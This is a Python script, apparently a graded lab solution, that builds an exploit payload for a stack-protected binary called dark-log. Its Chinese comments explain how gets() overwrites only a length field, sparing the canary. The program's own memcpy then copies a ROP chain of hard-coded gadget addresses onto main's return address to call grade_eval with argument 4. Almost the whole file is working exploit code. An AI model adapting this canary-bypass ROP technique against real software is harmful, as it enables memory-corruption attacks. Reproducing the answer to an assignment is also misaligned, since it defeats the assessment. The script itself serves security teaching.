#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

dark-log 开启了 Stack Protector：input() 的栈帧里 canary 在 [rbp-0x8]，
缓冲区 expression 在 [rbp-0x120]，中间还夹着 logMsg[128]、len、pad。
一步写穿到返回地址必然踩坏 canary，所以这里不直接写返回地址，而是：

  1. gets 只写到 [rbp-0x20] 的 len 为止，canary 一个字节都不碰；
  2. 把 len 改成一个精心选择的值，让程序自己的
     memcpy(logMsg + len, expression, 128)
     把 expression 开头 128 字节"搬"到我们想要的位置；
  3. canary 没被动过，函数结尾的校验自然通过，leave/ret 用的就是搬运过去的伪造返回地址。

  memcpy 目的地址 = (rbp-0xa0) + len
  想让搬运落在 main 的返回地址槽 [rbp+0x28]，取 len = 0xa8 + 0x20 = 0xc8。
  这样 input 和 main 自己的 canary 都完好无损。
"""
import sys

POP_RDI = 0x4018A3        # __libc_csu_init 里 "41 5f c3" 的第 2 字节：pop rdi; ret
RET = 0x4018B1            # __libc_csu_fini 里 "f3 c3" 的第 2 字节：ret（栈对齐）
GRADE_EVAL = 0x401677     # void grade_eval(int grade)
MAIN_TAIL = 0x401811      # main 中 input 返回后的下一条指令，用于正常收尾

OFFSET_LEN = 0x120 - 0x20  # expression 起点到 len 的距离 = 256
DST_OFFSET = 0xC8          # len 的取值：(rbp-0xa0) + 0xc8 == rbp+0x28


def p64(x):
    return x.to_bytes(8, "little")


# 这 128 字节会被 memcpy 原样复制到 [rbp+0x28]，正好覆盖 main 的返回地址
chain = p64(POP_RDI) + p64(4) + p64(RET) + p64(GRADE_EVAL) + p64(MAIN_TAIL)
chain = chain.ljust(128, b"B")

payload = chain                      # [rbp-0x120, rbp-0xa0)  expression
payload += b"C" * (OFFSET_LEN - 128)  # [rbp-0xa0,  rbp-0x20)  logMsg + 填充
payload += DST_OFFSET.to_bytes(4, "little")  # [rbp-0x20] len

sys.stdout.buffer.write(payload)
